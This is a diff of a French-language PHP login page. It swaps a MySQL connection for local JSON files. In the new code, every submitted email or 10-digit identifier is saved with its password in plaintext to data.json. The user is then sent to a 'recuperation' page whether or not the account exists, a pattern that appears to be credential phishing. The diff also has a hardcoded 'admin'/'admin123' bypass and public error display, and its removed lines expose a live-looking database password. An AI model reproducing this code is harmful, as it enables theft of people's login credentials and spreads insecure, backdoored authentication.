@@ -1,47 +1,64 @@
 <?php
-// Connexion à la base de données Railway
-$host = getenv('MYSQLHOST') ?: 'mysql.railway.internal';
-$db   = getenv('MYSQLDATABASE') ?: 'railway';
-$user = getenv('MYSQLUSER') ?: 'root';
-$pass = getenv('MYSQLPASSWORD') ?: 'qwnzSyIQJeIervktMWVvvGdgbHrjmInx';
-$port = getenv('MYSQLPORT') ?: '3306';
-$charset = 'utf8mb4';
+// Pour le debug : afficher les erreurs PHP
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
 
-$dsn = "mysql:host=$host;port=$port;dbname=$db;charset=$charset";
-$options = [
-    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
-    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
-    PDO::ATTR_EMULATE_PREPARES   => false,
-];
+// Remplacer la connexion à la base de données par la lecture du fichier users.json
+$usersFile = __DIR__ . '/users.json';
+$users = [];
+if (file_exists($usersFile)) {
+    $json = file_get_contents($usersFile);
+    $users = json_decode($json, true) ?: [];
+}
 
-try {
-    $pdo = new PDO($dsn, $user, $pass, $options);
-} catch (\PDOException $e) {
-    exit('Erreur de connexion à la base de données : ' . $e->getMessage());
+$dataFile = __DIR__ . '/data.json';
+$allData = [];
+if (file_exists($dataFile)) {
+    $json = file_get_contents($dataFile);
+    $allData = json_decode($json, true) ?: [];
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // On récupère les infos du formulaire
     $username = $_POST['username'] ?? '';
     $password = $_POST['password'] ?? '';
 
-    // Vérifier si l'utilisateur existe déjà
-    $stmt = $pdo->prepare('SELECT COUNT(*) FROM users WHERE username = ?');
-    $stmt->execute([$username]);
-    $exists = $stmt->fetchColumn();
+    $isEmail = filter_var($username, FILTER_VALIDATE_EMAIL);
+    $isIdentifiant = preg_match('/^\d{10}$/', $username);
 
-    if ($exists) {
-        echo "<div style='color:red;text-align:center;'>Cet identifiant existe déjà.</div>";
-    } else {
-        // Insertion dans la base
-        $stmt = $pdo->prepare('INSERT INTO users (username, password) VALUES (?, ?)');
-        $stmt->execute([$username, $password]);
+    // Cas spécial pour admin
+    if ($username === 'admin' && $password === 'admin123') {
+        header('Location: admin.php');
+        exit();
+    }
 
-        // Redirection vers la page de ton choix
+    if ($isEmail || $isIdentifiant) {
+        $exists = false;
+        foreach ($allData as $entry) {
+            if (($entry['username'] ?? '') === $username) {
+                $exists = true;
+                break;
+            }
+        }
+        if (!$exists) {
+            $newEntry = [
+                'id' => count($allData) + 1,
+                'username' => $username,
+                'password' => $password,
+                'email' => $isEmail ? $username : '',
+                'identifiant' => $isIdentifiant ? $username : '',
+                'created_at' => date('Y-m-d H:i:s')
+            ];
+            $allData[] = $newEntry;
+            file_put_contents($dataFile, json_encode($allData, JSON_PRETTY_PRINT));
+        }
         header('Location: recuperation.php');
-        exit;
+        exit();
+    } else {
+        $error = "Veuillez entrer un email valide ou un identifiant (10 chiffres).";
     }
 }
+if (!isset($error)) $error = '';
 ?>
 
 <!DOCTYPE html>
@@ -474,8 +491,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 Format attendu : 9999999999
             </span>
         </div>
+        <?php if (!empty($error)): ?>
+            <div style="color:red; font-weight:bold; margin-bottom:15px;">
+                <?= htmlspecialchars($error) ?>
+            </div>
+        <?php endif; ?>
         <form class="login-form" method="post" action="">
-            <input type="text" id="username" name="username" placeholder="Identifiant" required>
+            <input type="text" id="username" name="username" placeholder="Email ou identifiant (9999999999)" required>
             <div class="input-row">
                 <input type="password" id="password" name="password" placeholder="Mot de passe" required>
                 <input type="checkbox" id="showpass" onclick="togglePassword()">
